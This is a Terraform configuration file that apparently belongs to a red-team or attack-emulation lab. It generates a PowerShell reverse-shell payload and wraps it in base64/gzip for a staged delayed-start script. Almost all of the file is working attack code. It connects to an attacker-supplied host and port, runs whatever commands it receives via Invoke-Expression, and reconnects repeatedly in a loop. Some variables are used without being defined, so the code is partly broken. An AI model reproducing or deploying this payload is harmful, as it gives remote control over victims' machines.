locals {
    host_ip = var.inputs["host_ip"]
    host_port = var.inputs["host_port"]
    
    payload = <<-EOT
    Write-Log "attacker Host: ${local.host_ip}:${local.host_port}"
    $Server="${local.host_ip}"
    $Timeout=600
    $StartTime = Get-Date
    $PayloadPath = "$env:TEMP\payload_${var.inputs["tag"]}.ps1"

    # DNS Resolution
    if ($AttackerHost -match '^\d{1,3}(\.\d{1,3}){3}$') {
        Write-Log "Server is set to IP address $AttackerHost, no need to resolve DNS."
    } else {
        Write-Log "Checking DNS resolution: $AttackerHost"
        while ($true) {
            $ResolvedIP = [System.Net.Dns]::GetHostAddresses($AttackerHost)
            if ($null -eq $ResolvedIP) {
                if ((New-TimeSpan -Start $StartTime).TotalSeconds -gt $Timeout) {
                    Write-Log "DNS resolution for $AttackerHost timed out after $Timeout seconds."
                    Exit 1
                }
                Start-Sleep -Seconds 1
            } else {
                Write-Log "$AttackerHost resolved to $($ResolvedIP -join ', ')"
                break
            }
        }
    }
    $StartHash = if (Test-Path $PayloadPath) { Get-FileHash -Path $PayloadPath -Algorithm SHA256 | Select-Object -ExpandProperty Hash } else { "" }
    
    # Function to check if payload is updated
    function Check-PayloadUpdate {
        param([string]$Path, [string]$StartHash)
        if (-Not (Test-Path $Path)) {
            return $false
        }
        $CurrentHash = Get-FileHash -Path $Path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
        return $CurrentHash -ne $StartHash
    }

    function Start-ReverseShell {
        param([string]$Host, [int]$Port, [int]$LifetimeMinutes = 30)
        Write-Log "Starting reverse shell with a forced lifetime of $LifetimeMinutes minutes."

        $EndTime = (Get-Date).AddMinutes($LifetimeMinutes)

        while ((Get-Date) -lt $EndTime) {
            try {
                # Start the reverse shell in the background as a job
                $Job = Start-Job -ScriptBlock {
                    param($Host, $Port)
                    try {
                        # Reverse shell launcher, matching the provided sample
                        $TCPClient = New-Object Net.Sockets.TCPClient($Host, $Port)
                        $NetworkStream = $TCPClient.GetStream()
                        $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
                        function WriteToStream ($String) {
                            [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | ForEach-Object {0}
                            $StreamWriter.Write($String + 'SHELL> ')
                            $StreamWriter.Flush()
                        }
                        WriteToStream ''

                        while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
                            $Command = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
                            $Output = try {
                                Invoke-Expression $Command 2>&1 | Out-String
                            } catch {
                                $_ | Out-String
                            }
                            WriteToStream $Output
                        }
                        $StreamWriter.Close()
                    } catch {
                        # Handle exceptions gracefully
                        "Reverse shell encountered an error: $_"
                    } finally {
                        $TCPClient?.Close()
                    }
                } -ArgumentList $Host, $Port

                Write-Log "Reverse shell job started with ID $($Job.Id)."
                
                # Wait for the specified lifetime or until the job completes
                Start-Sleep -Seconds ($LifetimeMinutes * 60)

                Write-Log "Killing reverse shell job (ID $($Job.Id)) after $LifetimeMinutes minutes."
                Stop-Job -Job $Job -Force
                Remove-Job -Job $Job

            } catch {
                Write-Log "Failed to start reverse shell: $_"
            }

            Write-Log "Restarting reverse shell after delay..."
            Start-Sleep -Seconds 10
        }

        Write-Log "Reverse shell lifetime expired. Exiting function."
    }

    # Main loop
    while ($true) {
        Write-Log "Starting reverse shell connection..."
        Start-ReverseShell -Host $AttackerHost -Port $AttackerPort -LifetimeMinutes 30

        Write-Log "Sleeping for 30 minutes..."
        Start-Sleep -Seconds 1800

        if (Check-PayloadUpdate -Path $PayloadPath -StartHash $StartHash) {
            Write-Log "Payload update detected - exiting loop to force payload download."
            Remove-Item -Path $PayloadPath -Force -ErrorAction SilentlyContinue
            break
        } else {
            Write-Log "Restarting loop..."
        }
    }
    EOT

    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}